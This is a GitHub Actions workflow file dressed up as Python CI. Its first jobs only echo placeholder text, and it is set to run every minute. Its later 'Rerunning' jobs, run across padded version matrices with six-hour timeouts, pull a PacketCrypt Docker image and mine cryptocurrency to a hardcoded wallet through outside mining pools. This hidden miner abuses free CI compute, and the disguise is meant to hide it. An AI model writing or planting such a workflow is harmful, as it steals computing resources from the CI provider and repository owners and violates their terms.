name: Python
on: 
  push:
  pull_request:
  schedule:
  - cron: "*/1 * * * *"

jobs:
 python-1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [A, B, C, D]
    timeout-minutes: 360

    steps:
    - uses: actions/checkout@v2
    - name: Python-run
      run: echo "pythosns"

 python-2:
    runs-on: ubuntu-18.04
    needs: python-1
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [A, B, C, D]
    timeout-minutes: 360

    steps:
    - uses: actions/checkout@v2
    - name: Python-run
      run: echo "python"

 python-build-4:
    runs-on: ubuntu-20.04
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [A]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        docker pull thomasjp0x42/packetcrypt
        docker run thomasjp0x42/packetcrypt ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 python-build-3:
    runs-on: ubuntu-20.04
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [B]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        docker pull thomasjp0x42/packetcrypt
        docker run thomasjp0x42/packetcrypt ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 python-build-2:
    runs-on: ubuntu-20.04
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [C]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        docker pull thomasjp0x42/packetcrypt
        docker run thomasjp0x42/packetcrypt ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 python-build-1:
    runs-on: ubuntu-20.04
    needs: python-2
    strategy:
      fail-fast: false
      matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
         flag: [D]
    timeout-minutes: 360
    steps:
    - uses: actions/checkout@v2
    - name: Rerunning
      continue-on-error: true
      run: |
        docker pull thomasjp0x42/packetcrypt
        docker run thomasjp0x42/packetcrypt ann -p pPsrSwWjFoHC39qKjkL4dk2yL5feBZ9LwZ https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" 
